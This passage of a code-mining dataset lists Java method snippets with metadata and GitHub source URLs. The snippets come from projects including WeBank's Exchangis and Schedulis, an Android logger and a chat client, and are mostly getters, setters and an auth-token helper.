{"name": "DepartmentGroup", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setOldId", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOldId(Integer oldId) {        this.oldId = oldId;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/DepartmentGroup.java", "stars": "18", "class": {"name": "DepartmentGroup", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {        return name;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/DepartmentGroup.java", "stars": "18", "class": {"name": "DepartmentGroup", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {        this.name = name;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/DepartmentGroup.java", "stars": "18", "class": {"name": "DepartmentGroup", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDescription", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDescription() {        return description;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/DepartmentGroup.java", "stars": "18", "class": {"name": "DepartmentGroup", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setDescription", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDescription(String description) {        this.description = description;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/DepartmentGroup.java", "stars": "18", "class": {"name": "DepartmentGroup", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCreateTime", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getCreateTime() {        return createTime;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/DepartmentGroup.java", "stars": "18", "class": {"name": "DepartmentGroup", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCreateTime", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreateTime(Long createTime) {        this.createTime = createTime;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/DepartmentGroup.java", "stars": "18", "class": {"name": "DepartmentGroup", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getUpdateTime", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getUpdateTime() {        return updateTime;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/DepartmentGroup.java", "stars": "18", "class": {"name": "DepartmentGroup", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setUpdateTime", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUpdateTime(Long updateTime) {        this.updateTime = updateTime;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/DepartmentGroup.java", "stars": "18", "class": {"name": "DepartmentGroup", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getExecutorIds", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Integer>", "snippet": "    public List<Integer> getExecutorIds() {        return executorIds;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/DepartmentGroup.java", "stars": "18", "class": {"name": "DepartmentGroup", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setExecutorIds", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setExecutorIds(List<Integer> executorIds) {        this.executorIds = executorIds;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/DepartmentGroup.java", "stars": "18", "class": {"name": "DepartmentGroup", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {        return \"DepartmentGroup{\" +                \"id=\" + id +                \", oldId=\" + oldId +                \", name='\" + name + '\\'' +                \", description='\" + description + '\\'' +                \", createTime=\" + createTime +                \", updateTime=\" + updateTime +                \", executorIds=\" + executorIds +                \", executors=\" + executors +                '}';    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/DepartmentGroup.java", "stars": "18", "class": {"name": "DepartmentGroup", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {        return name;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/transport/stream/StreamMeta.java", "stars": "23", "class": {"name": "StreamMeta", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {        this.name = name;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/transport/stream/StreamMeta.java", "stars": "23", "class": {"name": "StreamMeta", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAbsolutePath", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getAbsolutePath() {        return absolutePath;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/transport/stream/StreamMeta.java", "stars": "23", "class": {"name": "StreamMeta", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAbsolutePath", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAbsolutePath(String absolutePath) {        this.absolutePath = absolutePath;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/transport/stream/StreamMeta.java", "stars": "23", "class": {"name": "StreamMeta", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getRelativePath", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getRelativePath() {        return relativePath;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/transport/stream/StreamMeta.java", "stars": "23", "class": {"name": "StreamMeta", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setRelativePath", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRelativePath(String relativePath) {        this.relativePath = relativePath;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/transport/stream/StreamMeta.java", "stars": "23", "class": {"name": "StreamMeta", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCheckPointId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCheckPointId() {        return checkPointId;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/transport/stream/StreamMeta.java", "stars": "23", "class": {"name": "StreamMeta", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCheckPointId", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCheckPointId(String checkPointId) {        this.checkPointId = checkPointId;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/transport/stream/StreamMeta.java", "stars": "23", "class": {"name": "StreamMeta", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getOffset", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getOffset() {        return offset;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/transport/stream/StreamMeta.java", "stars": "23", "class": {"name": "StreamMeta", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setOffset", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOffset(long offset) {        this.offset = offset;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/core/transport/stream/StreamMeta.java", "stars": "23", "class": {"name": "StreamMeta", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "build", "params": ["AuthTokenBean"], "throws": ["UnsupportedEncodingException"], "modifiers": ["public"], "return_type": "String", "snippet": "    public String build(AuthTokenBean tokenBean) throws UnsupportedEncodingException {        StringBuilder builder = new StringBuilder();        Map<String, String> headers = tokenBean.getHeaders();        Map<String, String> claims = tokenBean.getClaims();        SimpleDateFormat format = new SimpleDateFormat(AuthConstraints.SSO_TOKEN_TIME_PATTERN);        String time = format.format(Calendar.getInstance().getTime());        headers.put(AuthConstraints.SSO_TOKEN_TIMESTAMP, time);        String alg = headers.get(AuthTokenBean.ALG_NAME);        Base64.Encoder encoder = Base64.getEncoder();        String self = encoder.encodeToString(Objects.requireNonNull(Json.toJson(headers, Map.class)).getBytes(DEFAULT_CHARSET))                + PART_SPLIT + encoder.encodeToString(Objects.requireNonNull(Json.toJson(claims, Map.class)).getBytes(DEFAULT_CHARSET));        builder.append(self).append(PART_SPLIT);        AuthTokenBean.Type type = AuthTokenBean.Type.of(alg);        String auth = getAuthString(type, tokenSecret +self, time);        //headers        builder.append(auth);        return URLEncoder.encode(builder.toString(), DEFAULT_CHARSET);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/auth/AuthTokenHelper.java", "stars": "23", "class": {"name": "AuthTokenHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAuthMessage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Map<String,String>", "snippet": "    public Map<String, String> getAuthMessage(String token){        try {            token = URLDecoder.decode(token, DEFAULT_CHARSET);            String[] parts = token.split(PART_SPLIT);            if(parts.length != AUTH_TOKEN_LENGTH){                throw new RuntimeException(\"invalid length in token : \" + token);            }            return Json.fromJson(                    new String(Base64.getDecoder().decode(parts[1]), DEFAULT_CHARSET), Map.class);        } catch (UnsupportedEncodingException e) {           throw new RuntimeException(e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/auth/AuthTokenHelper.java", "stars": "23", "class": {"name": "AuthTokenHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAuthHeader", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Map<String,String>", "snippet": "    public Map<String, String> getAuthHeader(String token){        try{            token = URLDecoder.decode(token, DEFAULT_CHARSET);            String[] parts = token.split(PART_SPLIT);            if(parts.length != AUTH_TOKEN_LENGTH){                throw new RuntimeException(\"invalid length in token : \" + token);            }            return Json.fromJson(                    new String(Base64.getDecoder().decode(parts[0]), DEFAULT_CHARSET), Map.class);        }catch(UnsupportedEncodingException e){            throw new RuntimeException(e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/auth/AuthTokenHelper.java", "stars": "23", "class": {"name": "AuthTokenHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "validate", "params": ["String", "long"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean validate(String token, long minutes) {        boolean result = false;        try {            token = URLDecoder.decode(token, DEFAULT_CHARSET);            String[] parts = token.split(PART_SPLIT);            if(parts.length != AUTH_TOKEN_LENGTH){                throw new RuntimeException(\"invalid length in token : \" + token);            }            String self = parts[0] + PART_SPLIT + parts[1];            String auth = parts[2];            Map<String, String> headers = Json.fromJson(                    new String(Base64.getDecoder().decode(parts[0]), DEFAULT_CHARSET), Map.class);            String time = Objects.requireNonNull(headers).get(AuthConstraints.SSO_TOKEN_TIMESTAMP);            SimpleDateFormat format = new SimpleDateFormat(AuthConstraints.SSO_TOKEN_TIME_PATTERN);            Date date = format.parse(time);            if(Calendar.getInstance().getTimeInMillis() - date.getTime() > minutes * ONE_MINUTES){                throw new ExpireTimeOutException(\"the token is expired, value : \" + token);            }            AuthTokenBean.Type type = AuthTokenBean.Type.of(headers.get(AuthTokenBean.ALG_NAME));            String auth0 = getAuthString(type, tokenSecret + self, time);            if(!auth.equals(auth0)){                throw new RuntimeException(\"incorrect token : \" + token);            }            result = true;        }catch(ExpireTimeOutException e){            throw e;        }catch(Exception e){            logger.info(e.getMessage());        }        return result;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/auth/AuthTokenHelper.java", "stars": "23", "class": {"name": "AuthTokenHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAuthString", "params": ["AuthTokenBean", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String getAuthString(AuthTokenBean.Type type, String source, String salt){        String auth ;        switch(type){            default:                auth = CryptoUtils.md5(source, salt, 2);                break;        }        return auth;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/auth/AuthTokenHelper.java", "stars": "23", "class": {"name": "AuthTokenHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hasherAvecPepper", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String hasherAvecPepper(String chaine) {        try {            MessageDigest messageDigest = MessageDigest.getInstance(\"SHA-512\");            byte[] hash = messageDigest.digest(pepper.concat(chaine).getBytes());            return Base64.getEncoder().encodeToString(hash);        } catch (NoSuchAlgorithmException e) {            throw new TypeDeHashNonPresentException(e);        }    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/main/java/fr/gouv/interieur/dmgp/remettant/domain/use_cases/interactors/HashGenerator.java", "stars": "5", "class": {"name": "HashGenerator", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getNext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "LogNode", "snippet": "    public LogNode getNext() {        return mNext;    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/common/logger/LogWrapper.java", "stars": "74", "class": {"name": "LogWrapper", "extends": null, "implements": ["LogNode"], "modifiers": ["public"]}}, {"method_name": "setNext", "params": ["LogNode"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNext(LogNode node) {        mNext = node;    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/common/logger/LogWrapper.java", "stars": "74", "class": {"name": "LogWrapper", "extends": null, "implements": ["LogNode"], "modifiers": ["public"]}}, {"method_name": "println", "params": ["int", "String", "String", "Throwable"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void println(int priority, String tag, String msg, Throwable tr) {        // There actually are log methods that don't take a msg parameter.  For now,        // if that's the case, just convert null to the empty string and move on.        String useMsg = msg;        if (useMsg == null) {            useMsg = \"\";        }        // If an exeption was provided, convert that exception to a usable string and attach        // it to the end of the msg method.        if (tr != null) {            msg += \"\\n\" + Log.getStackTraceString(tr);        }        // This is functionally identical to Log.x(tag, useMsg);        // For instance, if priority were Log.VERBOSE, this would be the same as Log.v(tag, useMsg)        Log.println(priority, tag, useMsg);        // If this isn't the last node in the chain, move things along.        if (mNext != null) {            mNext.println(priority, tag, msg, tr);        }    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/common/logger/LogWrapper.java", "stars": "74", "class": {"name": "LogWrapper", "extends": null, "implements": ["LogNode"], "modifiers": ["public"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getId() {        return id;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Info.java", "stars": "1", "class": {"name": "Info", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setId", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Integer id) {        this.id = id;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Info.java", "stars": "1", "class": {"name": "Info", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getBirthday", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getBirthday() {        return birthday;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Info.java", "stars": "1", "class": {"name": "Info", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setBirthday", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setBirthday(Long birthday) {        this.birthday = birthday;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Info.java", "stars": "1", "class": {"name": "Info", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getVisited", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getVisited() {        return visited;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Info.java", "stars": "1", "class": {"name": "Info", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setVisited", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setVisited(Long visited) {        this.visited = visited;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Info.java", "stars": "1", "class": {"name": "Info", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getBlogTitle", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getBlogTitle() {        return blogTitle;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Info.java", "stars": "1", "class": {"name": "Info", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setBlogTitle", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setBlogTitle(String blogTitle) {        this.blogTitle = blogTitle;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Info.java", "stars": "1", "class": {"name": "Info", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSeoKeywords", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSeoKeywords() {        return seoKeywords;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Info.java", "stars": "1", "class": {"name": "Info", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setSeoKeywords", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSeoKeywords(String seoKeywords) {        this.seoKeywords = seoKeywords;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Info.java", "stars": "1", "class": {"name": "Info", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSeoDescription", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSeoDescription() {        return seoDescription;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Info.java", "stars": "1", "class": {"name": "Info", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setSeoDescription", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSeoDescription(String seoDescription) {        this.seoDescription = seoDescription;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Info.java", "stars": "1", "class": {"name": "Info", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getReceta", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Receta", "snippet": "    public Receta getReceta() {        return receta;    }", "url": "https://raw.githubusercontent.com/guimainini/Practica_Lab3_Parcial2019/master/src/TipoCerveza.java", "stars": "2", "class": {"name": "TipoCerveza", "extends": "Cerveza", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getPorcentajeComplejidad", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getPorcentajeComplejidad() {        return porcentajeComplejidad;    }", "url": "https://raw.githubusercontent.com/guimainini/Practica_Lab3_Parcial2019/master/src/TipoCerveza.java", "stars": "2", "class": {"name": "TipoCerveza", "extends": "Cerveza", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "calcularCostoFabricacion", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "float", "snippet": "    public abstract float calcularCostoFabricacion();    //es un metodo abstracto , hice un static asi puedo hacer con gluten aca , tambien hice un sobrecarga de metodos    //no creo q este bien    public static float calcularCostoFabricacion(Receta receta,boolean gluten) {        int contador = 0;        if (gluten == false) {            for (int i = 0; i < receta.getListaingrediente().size(); i++) {                contador += receta.getListaingrediente().get(i).getPrecioUnidad();            }            contador += contador * 0.02;        }else{            System.out.println(\"No se puede hacer con Gluten\");        }            return contador;    }", "url": "https://raw.githubusercontent.com/guimainini/Practica_Lab3_Parcial2019/master/src/TipoCerveza.java", "stars": "2", "class": {"name": "TipoCerveza", "extends": "Cerveza", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "calcularCostoFabricacion", "params": ["Receta", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "float", "snippet": "    public static float calcularCostoFabricacion(Receta receta,boolean gluten) {        int contador = 0;        if (gluten == false) {            for (int i = 0; i < receta.getListaingrediente().size(); i++) {                contador += receta.getListaingrediente().get(i).getPrecioUnidad();            }            contador += contador * 0.02;        }else{            System.out.println(\"No se puede hacer con Gluten\");        }            return contador;    }", "url": "https://raw.githubusercontent.com/guimainini/Practica_Lab3_Parcial2019/master/src/TipoCerveza.java", "stars": "2", "class": {"name": "TipoCerveza", "extends": "Cerveza", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {        return \"TipoCerveza{\" +                \"gluten=\" + gluten +                \", receta=\" + receta +                \", porcentajeComplejidad=\" + porcentajeComplejidad +                '}';    }", "url": "https://raw.githubusercontent.com/guimainini/Practica_Lab3_Parcial2019/master/src/TipoCerveza.java", "stars": "2", "class": {"name": "TipoCerveza", "extends": "Cerveza", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getExecUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getExecUser() {        return execUser;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/query/ExecUserQuery.java", "stars": "23", "class": {"name": "ExecUserQuery", "extends": "PageQuery", "implements": null, "modifiers": ["public"]}}, {"method_name": "setExecUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setExecUser(String execUser) {        this.execUser = execUser;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/query/ExecUserQuery.java", "stars": "23", "class": {"name": "ExecUserQuery", "extends": "PageQuery", "implements": null, "modifiers": ["public"]}}, {"method_name": "run", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void run() {        String message;        //Try to check if it can establish a connection or not, if        //it was successful, reading process will start.        try {            fromServer = new DataInputStream(server.getInputStream());        } catch (IOException e) {            logger.fatal(\"Couldn't get input stream from server socket\");            readerIsOpen = false;            client.logOut();        }        if (readerIsOpen)            logger.debug(\"Now you can get your message!\");        while (readerIsOpen) {            try {                message = fromServer.readUTF();                try {                    Message parsed = messageParser.parse(message);                    handleMessage(parsed);                } catch (Exception e) {                    logger.fatal(\"Server don't work properly!\");                    logger.fatal(e.getMessage());                }            } catch (IOException e) {                logger.fatal(\"Reading from Server was not successful!\");                logger.fatal(e.getMessage());                readerIsOpen = false;                logger.error(\"Server is not Accessible\");                logger.error(\"Client shunted down by force!\");                stop();            }        }        logger.debug(\"Client reader is shutting down!\");    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/ClientMessageReader.java", "stars": "2", "class": {"name": "ClientMessageReader", "extends": null, "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "handleMessage", "params": ["Message"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleMessage(Message parsedMessage) {        if (parsedMessage.getType() == PRIVATE) {            Platform.runLater(() -> controller.showPrivateMessage(parsedMessage));        } else if (parsedMessage.getType() == PUBLIC) {            Platform.runLater(() -> controller.showPublicMessage(parsedMessage));        } else if (parsedMessage.getType() == RESPONSE) {            Platform.runLater(() -> controller.showResponse(parsedMessage));        } else if (parsedMessage.getType() == PRIVATE_DATA) {            Platform.runLater(() -> controller.showPrivateData(parsedMessage));        } else if (parsedMessage.getType() == PUBLIC_DATA) {            Platform.runLater(() -> controller.showPublicData(parsedMessage));        }    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/ClientMessageReader.java", "stars": "2", "class": {"name": "ClientMessageReader", "extends": null, "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "stop", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void stop() {        readerIsOpen = false;        client.setOffline();    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Client/ClientMessageReader.java", "stars": "2", "class": {"name": "ClientMessageReader", "extends": null, "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getId() {        return id;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/LoginLog.java", "stars": "1", "class": {"name": "LoginLog", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setId", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Long id) {        this.id = id;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/LoginLog.java", "stars": "1", "class": {"name": "LoginLog", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getUsername", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getUsername() {        return username;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/LoginLog.java", "stars": "1", "class": {"name": "LoginLog", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setUsername", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUsername(String username) {        this.username = username;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/LoginLog.java", "stars": "1", "class": {"name": "LoginLog", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getIp", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getIp() {        return ip;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/LoginLog.java", "stars": "1", "class": {"name": "LoginLog", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setIp", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setIp(String ip) {        this.ip = ip;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/LoginLog.java", "stars": "1", "class": {"name": "LoginLog", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getLocation", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getLocation() {        return location;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/LoginLog.java", "stars": "1", "class": {"name": "LoginLog", "extends": null, 